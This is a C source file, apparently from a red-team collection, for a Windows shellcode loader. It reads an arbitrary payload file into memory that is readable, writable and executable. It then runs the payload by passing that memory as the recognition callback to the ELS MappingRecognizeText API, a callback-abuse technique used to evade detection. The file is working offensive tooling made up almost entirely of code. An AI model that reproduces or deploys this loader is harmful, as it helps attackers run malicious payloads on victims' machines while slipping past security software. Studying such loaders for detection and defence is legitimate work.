// Wra7h/FlavorTown
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Elscore.lib")

#include <stdio.h>
#include <windows.h>
#include <elscore.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;
	
	if (argc != 2)
	{
		printf("Usage: MappingRecognizeText.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	PMAPPING_SERVICE_INFO SMSI = NULL;
	DWORD dwServiceCount = 0;

	MAPPING_PROPERTY_BAG SMPB = { 0 };
	SMPB.Size = sizeof(MAPPING_PROPERTY_BAG);

	MAPPING_OPTIONS SMO = { 0 };
	SMO.Size = sizeof(MAPPING_OPTIONS);
	SMO.pfnRecognizeCallback = (PFN_MAPPINGCALLBACKPROC)hAlloc;
	
	MappingGetServices(NULL, &SMSI, &dwServiceCount);
	MappingRecognizeText(&SMSI[0], L"WRA7H", wcslen(L"WRA7H"), 0, &SMO, &SMPB);

	SleepEx(INFINITE, TRUE);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}